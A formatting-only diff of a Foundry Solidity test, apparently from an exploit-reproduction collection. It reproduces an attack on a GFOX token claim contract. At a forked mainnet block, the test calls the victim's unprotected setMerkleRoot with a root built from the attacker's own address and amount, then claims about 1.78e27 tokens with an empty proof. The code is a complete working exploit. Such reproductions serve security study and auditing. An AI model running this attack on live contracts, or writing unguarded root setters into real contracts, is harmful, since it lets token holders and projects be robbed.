@@ -21,16 +21,15 @@ import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 pragma solidity ^0.8.0;
 
 interface IVictim {
+
     function setMerkleRoot(bytes32 _merkleRoot) external;
 
-    function claim(
-        address to,
-        uint256 amount,
-        bytes32[] calldata proof
-    ) external;
+    function claim(address to, uint256 amount, bytes32[] calldata proof) external;
+
 }
 
 contract GFOXExploit is Test {
+
     uint256 blocknumToForkFrom = 19_835_924;
     IERC20 private gfox;
     IVictim private victim;
@@ -42,23 +41,15 @@ contract GFOXExploit is Test {
     }
 
     modifier balanceLog() {
-        emit log_named_decimal_uint(
-            "Attacker GFOX Balance Before exploit",
-            getBalance(gfox),
-            18
-        );
+        emit log_named_decimal_uint("Attacker GFOX Balance Before exploit", getBalance(gfox), 18);
         _;
-        emit log_named_decimal_uint(
-            "Attacker GFOX Balance After exploit",
-            getBalance(gfox),
-            18
-        );
+        emit log_named_decimal_uint("Attacker GFOX Balance After exploit", getBalance(gfox), 18);
     }
 
     function testExploit() external balanceLog {
         //implement exploit code here
         // the amount of GFOX to be transferred
-        uint256 amount = 1780453099185000000000000000;
+        uint256 amount = 1_780_453_099_185_000_000_000_000_000;
         // set the merkle root
         bytes32 root = _merkleRoot(address(this), amount);
         victim.setMerkleRoot(root);
@@ -66,14 +57,12 @@ contract GFOXExploit is Test {
         victim.claim(address(this), amount, new bytes32[](0));
     }
 
-    function _merkleRoot(
-        address to,
-        uint256 amount
-    ) internal pure returns (bytes32) {
+    function _merkleRoot(address to, uint256 amount) internal pure returns (bytes32) {
         return keccak256(abi.encodePacked(to, amount));
     }
 
     function getBalance(IERC20 token) private view returns (uint256) {
         return token.balanceOf(address(this));
     }
+
 }
